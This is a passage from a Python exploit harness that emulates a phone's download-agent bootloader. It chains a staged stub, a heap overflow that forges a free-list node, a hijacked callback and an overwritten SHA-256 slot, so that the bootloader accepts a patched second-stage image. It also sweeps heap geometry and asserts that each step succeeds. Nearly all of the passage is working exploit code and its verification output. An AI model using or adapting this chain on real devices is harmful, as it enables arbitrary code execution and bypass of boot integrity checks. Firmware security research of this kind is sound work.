    emu.rx.append(b"OK\x00")
    emu.rx.append(BENIGN_XML)
    emu.budget["hits"] = 0
    benign_rc = emu.call(CMD_LOOP, []) & 0xFFFFFFFF
    benign_tx = [bytes(t) for t in emu.tx]
    out["benign_rc"] = benign_rc
    out["benign_tx"] = [t.decode("latin-1", "replace") for t in benign_tx]
    out["assert_cmdloop"] = any(b"<command>CMD:END</command>" in t
                                and b"<result>OK</result>" in t
                                for t in benign_tx)

    # ---- (iv) hash slot -------------------------------------------------
    slot = bytes(emu.uc.mem_read(DA1_SLOT, 32))
    out["hash_slot"] = slot.hex()
    out["hash_written"] = digest.hex()
    out["assert_slot"] = slot == digest

    # ---- (v) real BOOT-TO with the patched DA2 -------------------------
    if not _mapped(emu, FS_STAGE):
        emu.uc.mem_map(FS_STAGE, 0x100000)
    probe = BootProbe(emu)
    run = run_boot_to(emu, bytes(body), probe)
    boot_cb = u32(emu.uc, DPC_STRUCT + 4)
    boot_arg = u32(emu.uc, DPC_STRUCT + 8)
    staging = bytes(emu.uc.mem_read(FS_STAGE, 32))
    out["boot_to"] = {"rc": run["rc"], "dpc_cb": boot_cb,
                      "dpc_arg": boot_arg, "staging_head": staging.hex(),
                      "probe": run["probe"], "sent": run["sent"],
                      "tx": [t.decode("latin-1", "replace") for t in run["tx"]]}
    out["assert_bootto"] = bool(
        run["rc"] == 0 and boot_cb == FS_STAGE and boot_arg == BOOT_ARG_OK
        and not run["probe"]["mismatch_branch"]
        and run["probe"]["cmp_bytes"] >= 32
        and run["probe"]["ok_log"]
        and staging == bytes(body[:32])
        and run["sent"] == DA2_BODY)

    # direct call of DA1's 0x2522c4 over what BOOT-TO staged (model)
    emu.write_bytes(SHA_OUT_ADDR, b"\xAA" * 0x30)
    emu.write_bytes(SHA_OUTLEN_ADDR, b"\xBB" * 4)
    emu.call(SHA_ROUTINE, [FS_STAGE, DA2_BODY, SHA_OUT_ADDR, SHA_OUTLEN_ADDR])
    sha_out = bytes(emu.uc.mem_read(SHA_OUT_ADDR, 32))
    out["sha_routine"] = {"out": sha_out.hex(),
                          "outlen": u32(emu.uc, SHA_OUTLEN_ADDR),
                          "equal_slot": sha_out == slot}
    out["assert_sha"] = bool(sha_out == slot
                             and out["sha_routine"]["outlen"] == 32)

    # ---- no-heap-address proof ----------------------------------------
    heap = emu.heap_state()
    out["heap"] = heap
    constants = {
        "fake_header[0] magic": FAKE_HDR[0],
        "fake_header[1] forged node": FAKE_HDR[1],
        "fake_header[2] cb size": FAKE_HDR[2],
        "stub entry": STUB_ENTRY,
        "digest address": STUB_ENTRY + DIGEST_OFF,
        "declared L": L,
        "slot": DA1_SLOT,
    }
    inside = [k for k, v in constants.items()
              if heap["base"] <= v < heap["base"] + heap["size"]]
    d_bytes = struct.pack("<I", D).hex() if D else None
    out["no_heap"] = {"constants": {k: hex(v) for k, v in constants.items()},
                      "payload_hex": payload.hex(),
                      "inside_heap": inside,
                      "download_buffer_used_in_payload": (
                          bool(d_bytes) and d_bytes in payload.hex()),
                      "ok": not inside}
    out["sha_model_label"] = "hashlib model at 0x2522c4 (see [DEV])"
    # informational: show the native 0x2522c4 cannot produce a digest in Unicorn
    out["sha_native_probe"] = sha_native_probe(image, bytes(body[:0x400]))

    out["checks"] = {
        "prelude_staged": pre["staged_equal"],
        "prelude_hash_mismatch": pre["rc_is_hash_mismatch"],
        "prelude_not_transport": not pre["rc_is_transport"],
        "payload_from_constants": out["payload_sent_by_host"],
        "stub_not_in_download_buffer": bool(out["payload_body_is_zeros"]
                                           and not out["stub_in_download_buffer"]),
        "exact_fit": out["exact_fit"],
        "victim_allocated": out["victim_allocated"],
        "fire": out["fire_ok"],
        "blx_target": out["blx_ok"],
        "stub_entered": out["stub_entered"],
        "stub_returned": out["stub_returned"],
        "freelist": out["assert_freelist"],
        "alloc": out["assert_alloc"],
        "cmdloop": out["assert_cmdloop"],
        "slot": out["assert_slot"],
        "sha_routine": out["assert_sha"],
        "bootto_gate": out["assert_bootto"],
        "no_heap_address": out["no_heap"]["ok"],
    }
    out["pass"] = all(out["checks"].values())
    return out


def _mapped(emu, addr: int) -> bool:
    try:
        emu.uc.mem_read(addr, 4)
        return True
    except Exception:
        return False


# ---------------------------------------------------------------------------
# reporting
# ---------------------------------------------------------------------------
def _fmt_free(nodes, limit=6):
    return ", ".join(f"{n['addr']:#x}/{n['size']:#x}" for n in nodes[:limit])


WIDTHS = (15, 9, 6, 9, 3, 9, 9, 9, 6, 5, 10, 9)


def _row(cells, widths=WIDTHS) -> str:
    return "  ".join(str(c).ljust(w) for c, w in zip(cells, widths))


def _span(vals) -> str:
    vals = [v for v in vals if v is not None]
    if not vals:
        return "-"
    lo, hi = min(vals), max(vals)
    return f"{lo:#x}" if lo == hi else f"{lo:#x}-{hi:#x}"


def report_table(rows: list, prelude: bool) -> None:
    """Geometry table, grouped over contiguous Ls with identical outcome.

    One row per group; the per-L rows are in the --json output.
    """
    title = "with staging prelude" if prelude else "no prelude (reference)"
    print(f"-- geometry sweep ({title}): {len(rows)} runs --")
    hdr = ("L", "D", "chunk", "need", "fit", "cap", "next", "victim",
           "valloc", "vfree", "fire(cb)", "dpc_cb")
    print("  " + _row(hdr))
    print("  " + "  ".join("-" * w for w in WIDTHS))
    groups = []
    for r in rows:
        sig = (r["D"], r["chunk"], r["exact"], r["victim_alloc"], r["victim_freed"],
               (r["fire"] or {}).get("value"), r.get("dpc_cb"))
        if groups and groups[-1][0] == sig:
            groups[-1][1].append(r)
        else:
            groups.append((sig, [r]))
    for sig, g in groups:
        D, chunk, exact, valloc, vfree, firev, dpc = sig
        cells = (
            _span([r["L"] for r in g]),
            f"{D:#x}" if D else "-",
            f"{chunk:#x}" if chunk is not None else "-",
            _span([r["needed"] for r in g]),
            "yes" if exact else "no",
            _span([r["capacity"] for r in g]),
            _span([r["next"] for r in g]),
            _span([r["victim"] for r in g]),
            "yes" if valloc else "no",
            "yes" if vfree else "no",
            f"{firev:#x}" if firev is not None else "-",
            f"{dpc:#x}" if dpc is not None else "-",
        )
        print("  " + _row(cells))
    if rows:
        steps = {b["L"] - a["L"] for a, b in zip(rows, rows[1:])}
        if len(steps) == 1:
            print(f"  (L step {steps.pop():#x}; full per-L data in --json)")


def report(res: dict, sweep_rows: list, sweep_ref: list,
           quiet: bool) -> int:
    p = print

    def hx(v):
        return f"0x{v:x}" if isinstance(v, int) else "none"

    p("=" * 78)
    p("DA1 fixed-stage chain: failing BOOT-TO staging -> HeapBait(cb=0x40000000)")
    p("                     -> stub @0x40000000 -> hash slot")
    p("=" * 78)
    p(f"image            : {res['image']}")
    p(f"DA2              : {res['da2_path']}")
    d = res["da2_patch"]
    p(f"DA2 patch        : body[{d['offset']:#x}] ^= {d['xor']:#04x} "
      f"(length preserved: {d['length_preserved']}, body {d['length']:#x} B)")
    p(f"  old digest     : {d['old_digest']}")
    p(f"  new digest     : {d['new_digest']}")
    p("[DEV] SHA-256 hardware engine at 0x2522c4 is MODELLED WITH hashlib.")
    p("      The native routine drives the clock gate 0x1000108c and the crypto")
    p("      engine 0x10210a08 (no software K table in the image), so Unicorn")
    p("      cannot execute it.  The BOOT-TO download, the compare loop")
    p("      0x20128c..0x2012b4 and both branches run as native DA1 code.")

    pre = res["prelude"]
    p("")
    p("-- step 2: staging prelude (one *failing* CMD:BOOT-TO) --")
    lo = pre["blob_layout"]
    p(f"blob             : {pre['blob_len']} bytes (0x{pre['blob_len']:x}) sent "
      f"to 0x{FS_STAGE:x}")
    p(f"  layout         : stub @+0x0 ({lo['stub_len']} B), zeros @+"
      f"{lo['pad'][0]:#x}..+{lo['pad'][1]:#x}, sha256 @+{lo['digest_at']:#x}")
    p(f"  sha256(blob)   : {pre['sha256_blob']}")
    p(f"  slot 0x2688cc  : {pre['slot_before']}  (unchanged={pre['slot_unchanged']}, "
      f"== sha256(blob): {pre['sha_blob_equals_slot']})")
    p(f"  handler rc     : {pre['rc']:#x}  "
      f"hash-mismatch={pre['rc_is_hash_mismatch']} "
      f"transport-error={pre['rc_is_transport']}")
    p(f"  bytes delivered: {pre['bytes_sent']}/{pre['blob_len']}  "
      f"staged at 0x{FS_STAGE:x} == sent blob: {pre['staged_equal']} "
      f"(diff offsets: {pre['staged_diff_offsets'] or 'none'})")
    p(f"  compare loop   : region hits={pre['probe']['cmp_region_hits']} "
      f"byte compares={pre['probe']['cmp_bytes']} "
      f"(first differing digest byte = {pre['first_diff_byte']}, "
      f"expected {pre['expected_cmp_hits']}) "
      f"mismatch branch 0x201338 taken={pre['probe']['mismatch_branch']} "
      f"mismatch log site 0x2013ec={pre['probe']['mismatch_log']} "
      f"ok-log={pre['probe']['ok_log']}")
    p(f"  sha inputs     : "
      + ", ".join(f"{c['in']:#x}/{c['len']:#x}" for c in pre["probe"]["sha_calls"]))
    p(f"  DA tx log      : 'DA Hash mismatch' present="
      f"{pre['tx_hash_mismatch_log']} (log level may suppress the send)")
    p(f"  dpc after      : {[hex(v) for v in pre['dpc_after']]} "
      f"(untouched={pre['dpc_untouched']})")
    p(f"  staged head    : {pre['staged_head_hex']}")
    p(f"  staged digest  : {pre['staged_digest_hex']}")

    if res.get("fatal"):
        p("")
        p(f"FATAL: {res['fatal']}")
        p("RESULT: FAIL")
        return 1

    p("")
    p("-- step 3: post-prelude DRAM-REPAIR geometry --")
    chosen_row = next((r for r in sweep_rows if r["L"] == res["L"]), None)
    rep = chosen_row or (sweep_rows[0] if sweep_rows else None)
    if rep and rep.get("free_at_malloc"):
        p(f"free list at download-malloc time (L={rep['L']:#x}): "
          + _fmt_free(rep["free_at_malloc"]))
    report_table(sweep_rows, prelude=True)
    exact = [r for r in sweep_rows if r["exact"]]
    cands = [r for r in sweep_rows if r["ok"]]
    p("")
    p("exact-fit L      : "
      + (", ".join(f"{r['L']:#x}(node={r['chunk']:#x},next={r['next']:#x})"
                   for r in exact) or "NONE"))
    p("firing L         : "
      + (", ".join(f"{r['L']:#x}(cb={r['fire']['value']:#x})"
                   for r in cands) or "NONE"))
    if sweep_ref:
        ref_exact = [r["L"] for r in sweep_ref if r["exact"]]
        refcands = [r["L"] for r in sweep_ref if r["ok"]]
        p("reference        : no-prelude exact-fit L = "
          + (", ".join(f"{x:#x}" for x in ref_exact) or "none")
          + "; firing L = " + (", ".join(f"{x:#x}" for x in refcands) or "none")
          + f"  ({len(sweep_ref)} runs)")

    chosen = res["L"]
    if not cands and res.get("sweep_skipped"):
        p("")
        p(f"NOTE: geometry sweep skipped (--no-sweep); L={chosen:#x} is used "
          f"without step-3 verification.")
    elif not cands:
        p("")
        p("STEP 3 FALLBACK: no exact-fit L after the prelude.")
        p("post-prelude free list: see the 'free list at download-malloc time' "
          "line above; no candidate satisfies exact-fit + live-victim-freed.")
        p("most promising alternative: two-buffer shaping -- issue an "
          "exact-length download first to create a hole whose upper neighbour "
          "is the cmd_loop XML victim chunk, then overflow into it; or stage a "
          "second BOOT-TO blob to shift the heap by a known amount.")
        p("RESULT: FAIL (step 3 has no verified candidate)")
        return 1

    p(f"chosen L         : {chosen:#x}  (capacity={res['capacity']:#x}, "
      f"exact_fit={res['exact_fit']})")

    ev = res["events"]
    p("")
    p("-- step 4: final chain (constants only) --")
    p(f"fake header      : {{0x{FAKE_HDR[0]:08x}, 0x{FAKE_HDR[1]:x}, "
      f"0x{FAKE_HDR[2]:x}}}  (payload {res['payload']['len']:#x} B, header "
      f"0xc B at +{res['capacity']:#x}; download-buffer body all zero: "
      f"{res['payload_body_is_zeros']})")
    p(f"download buffer  : D={hx(res['download_buffer'])} "
      f"(predicted {hx(res['predicted_buffer'])}) chunk={hx(res['chunk'])} "
      f"capacity={hx(res['capacity'])}")
    vai = res.get("victim_alloc_info") or {}
    p(f"next chunk       : {hx(res['next_chunk'])} victim user="
      f"{hx(res['victim_user'])}")
    p(f"  victim chunk   : allocated={res['victim_allocated']} "
      f"(malloc({vai.get('request', 0):#x}) @lr={hx(vai.get('lr'))}, XML node) "
      f"freed={res['victim_freed']} (free caller lr="
      f"{hx(res.get('victim_free_lr'))})")
    p(f"  note           : the same address is also freed once *before* the "
      f"overflow by the download-request XML tree "
      f"({res.get('victim_free_count')} frees total, only the post-overflow "
      f"one fires; fire_count={res.get('fire_count')})")
    fw = ev["fire"]
    if fw:
        p(f"fire write       : *(0x{fw['node']:x}+8) = {fw['value']:#x}  "
          f"(free() core @0x2043cc, before insert())")
    if ev.get("forged_links"):
        prev, nxt = ev["forged_links"]
        p(f"forged node links: [0x{FORGED_NODE:x}]={hx(prev)} "
          f"[0x{FORGED_NODE + 4:x}]={hx(nxt)}  (state the stub unlinks)")
    blx = res["blx"]
    if blx:
        p(f"blx @0x2040d4    : target={blx['target']:#x} r0={blx['r0']:#x} "
          f"r1={blx['r1']:#x} r2={blx['r2']:#x} r3={blx['r3']:#x} "
          f"sp={blx['sp']:#x} (lr before blx={blx['lr']:#x})")
    p(f"stub             : entry hits={ev['stub_entry']} at 0x{STUB_ENTRY:x} "
      f"lr={hx(ev.get('stub_lr'))} r4={hx(ev.get('stub_r4'))}; "
      f"bx-lr hits={ev['stub_exit']}; safe continuation 0x2040d8 hits="
      f"{ev['safe_cont']}")
    p(f"payload bytes    : {res['payload']['hex']}")
    p("")
    p(f"stub @0x{STUB_ENTRY:08x}: {res['stub_bytes']} bytes "
      f"(digest lives at 0x{STUB_ENTRY + DIGEST_OFF:08x})")
    if not quiet:
        p("  hexdump:")
        for line in hexdump(bytes.fromhex(res["stub_hex"]), STUB_ENTRY):
            p(line)
        p("  capstone:")
        for line in res["stub_disasm"]:
            p("    " + line)

    p("")
    p("-- step 5: assertions (proved by execution) --")
    fa = res["free_list_after"]
    p(f"(i)   free-list walk     : nodes={fa['count']} "
      f"sentinel={fa['sentinel_reached']} forged_present={fa['forged_present']} "
      f"-> {'PASS' if res['assert_freelist'] else 'FAIL'}")
    p("      chain: " + " -> ".join(f"{n['addr']:#x}/{n['size']:#x}"
                                  for n in fa["nodes"][:8]))
    p(f"(ii)  malloc(0x100)+free x3: "
      + ", ".join(f"{r['ptr']:#x}" for r in res["alloc_rounds"])
      + f" -> {'PASS' if res['assert_alloc'] else 'FAIL'}")
    p(f"(iii) cmd_loop serves 1 more command (CMD:SET-HOST-INFO): "
      f"rc={res['benign_rc']:#x} -> "
      f"{'PASS' if res['assert_cmdloop'] else 'FAIL'}")
    for t in res["benign_tx"]:
        if "CMD:END" in t:
            txt = "".join(c if 32 <= ord(c) < 127 else "" for c in t)
            p(f"      {txt.split('<arg>')[-1][:120]}")
    p(f"(iv)  memory[0x2688cc:0x2688ec] == sha256(patched DA2): "
      f"{'PASS' if res['assert_slot'] else 'FAIL'}")
    p(f"      slot : {res['hash_slot']}")
    p(f"      want : {res['hash_written']}")
    sh = res["sha_routine"]
    nprobe = res["sha_native_probe"]
    p(f"(vi)  native 0x2522c4 without the model: status={nprobe['status']!r} "
      f"pc={nprobe['pc']:#x} matches_hashlib={nprobe['matches_hashlib']}")
    p(f"      {nprobe['note']}")
    p(f"(v)   0x2522c4 over 0x40000000 (len {DA2_BODY:#x}) -> outlen="
      f"{sh['outlen']} equal_slot={sh['equal_slot']} -> "
      f"{'PASS' if res['assert_sha'] else 'FAIL'}  [sha model: hashlib]")
    bt = res["boot_to"]
    p(f"      BOOT-TO gate: rc={bt['rc']:#x} dpc->cb={bt['dpc_cb']:#x} "
      f"dpc->arg={bt['dpc_arg']:#x} compare-region hits="
      f"{bt['probe']['cmp_region_hits']} bytes={bt['probe']['cmp_bytes']} "
      f"mismatch={bt['probe']['mismatch_branch']} "
      f"ok_log={bt['probe']['ok_log']} sent={bt['sent']:#x} -> "
      f"{'PASS' if res['assert_bootto'] else 'FAIL'}")

    p("")
    p("-- step 6: no heap address used (constants printed) --")
    nh = res["no_heap"]
    for k, v in nh["constants"].items():
        p(f"  {k:26s}: {v}")
    p(f"  payload                    : {nh['payload_hex']}")
    p(f"  runtime heap window        : 0x{res['heap']['base']:x}.."
      f"0x{res['heap']['base'] + res['heap']['size']:x}")
    p(f"  constants inside heap      : {nh['inside_heap'] or 'none'}")
    p(f"  download buffer hex in payload: "
      f"{nh['download_buffer_used_in_payload']} (D is only reported, never used)")
    p(f"  payload == constants builder: {res['payload_sent_by_host']}")
    p(f"  stub blob == constants     : {res['blob_matches_constants']}")
    p(f"  -> NOHEAP {'PASS' if nh['ok'] else 'FAIL'}")

    p("")
    p("-- PASS block (machine checkable) --")
    for k, v in res["checks"].items():
        p(f"CHECK {k:22s} {'PASS' if v else 'FAIL'}")
    p(f"FIRE dpc->cb=0x{FS_STAGE:x}"
      if res["fire_ok"] else "FIRE FAIL")
    p(f"BLX target=0x{STUB_ENTRY:x}" if res["blx_ok"] else "BLX FAIL")
    p(f"STUB entry=0x{STUB_ENTRY:x} bytes={res['stub_bytes']}"
      if res["stub_entered"] and res["stub_returned"] else "STUB FAIL")
    p(f"STUB_RETURN lr=0x{SAFE_CONT:x} hits={res['events']['safe_cont']}"
      if res["stub_returned"] else "STUB_RETURN FAIL")
    p(f"FREELIST ok nodes={res['free_list_after']['count']}"
      if res["assert_freelist"] else "FREELIST FAIL")
    p("ALLOC ok" if res["assert_alloc"] else "ALLOC FAIL")
    p("CMDLOOP ok" if res["assert_cmdloop"] else "CMDLOOP FAIL")
    p(f"HASH written={res['hash_slot']}" if res["assert_slot"]
      else f"HASH MISMATCH={res['hash_slot']}")
    p(f"BOOT-TO gate PASS cb=0x{FS_STAGE:x}"
      if res["assert_bootto"] else "BOOT-TO gate FAIL")
    p(f"NOHEAP ok constants="
      + ",".join(nh["constants"].values()))
    p(f"L=0x{res['L']:x} capacity=0x{res['capacity']:x}")
    p("")
    p("RESULT: PASS" if res["pass"] else "RESULT: FAIL")
    return 0 if res["pass"] else 1


# ---------------------------------------------------------------------------
def main(argv=None) -> int:
    ap = argparse.ArgumentParser(
        description="DA1 fixed-address staging + HeapBait chain (no heap "
                    "address dependence)")
    ap.add_argument("--image", default=os.path.join(
        _HERE, "rmx3630-da2", "da1_allinone.bin"))
    ap.add_argument("--da2", default=os.path.join(
        _HERE, "rmx3630-da2", "da2_oplus.bin"),
        help="DA2 container (body = first 0x56ec8 bytes)")
    ap.add_argument("--L", type=_hexint, default=None,
                    help=f"declared DRAM-REPAIR length (default: sweep winner)")
    ap.add_argument("--sweep-lo", type=_hexint, default=0x10)
    ap.add_argument("--sweep-hi", type=_hexint, default=0x200)
    ap.add_argument("--sweep-step", type=_hexint, default=0x4)
    ap.add_argument("--no-sweep", action="store_true",
                    help="skip the geometry sweep (uses --L or 0x3c)")
    ap.add_argument("--no-ref-sweep", action="store_true",
                    help="skip the no-prelude reference sweep")
    ap.add_argument("--json", default=None, help="write full results as JSON")
    ap.add_argument("--quiet", action="store_true")
    args = ap.parse_args(argv)

    for path in (args.image, args.da2):
        if not os.path.isfile(path):
            ap.error(f"file not found: {path}")

    stub, stub_asm = build_stub()
    da2 = open(args.da2, "rb").read()
    body = bytearray(da2[:DA2_BODY])
    body[PATCH_OFFSET] ^= PATCH_XOR
    digest = hashlib.sha256(bytes(body)).digest()
    blob = make_blob(stub, digest)

    print(f"image     : {os.path.abspath(args.image)}")
    print(f"DA2       : {os.path.abspath(args.da2)}")
    print(f"stub      : {len(stub)} bytes at 0x{STUB_ENTRY:x}, "
          f"digest at 0x{STUB_ENTRY + DIGEST_OFF:x}, blob {len(blob)} bytes")
    print("[DEV] SHA-256 engine at 0x2522c4 is modelled with hashlib")
    print("      (the native path needs the hardware crypto block; see report).")

    rows = []
    ref = []
    if not args.no_sweep:
        print(f"\nsweeping L=0x{args.sweep_lo:x}..0x{args.sweep_hi:x} "
              f"step 0x{args.sweep_step:x} (post-prelude)...", flush=True)
        rows = sweep(args.image, args.sweep_lo, args.sweep_hi,
                     args.sweep_step, blob)
        if not args.no_ref_sweep:
            print("reference sweep without prelude "
                  f"(L=0x{args.sweep_lo:x}..min(0x80,...))...", flush=True)
            ref = sweep(args.image, args.sweep_lo, min(0x80, args.sweep_hi),
                        0x4, None)

    cands = [r for r in rows if r["ok"]]
    if args.L is not None:
        chosen = args.L
    elif cands:
        chosen = cands[0]["L"]
    else:
        chosen = L_FINAL

    print(f"\nfinal chain (L={chosen:#x})...", flush=True)
    res = run_final_chain(args.image, args.da2, chosen, stub, blob,
                          verbose=False)
    res["sweep_skipped"] = bool(args.no_sweep)
    res["stub_hex"] = stub.hex()
    res["stub_disasm"] = stub_asm
    res["sweep_rows"] = rows
    res["sweep_ref"] = ref

    if args.json:
        with open(args.json, "w") as f:
            json.dump(res, f, indent=1)
        print(f"json written: {args.json}")

    return report(res, rows, ref, args.quiet)


if __name__ == "__main__":
    sys.exit(main())
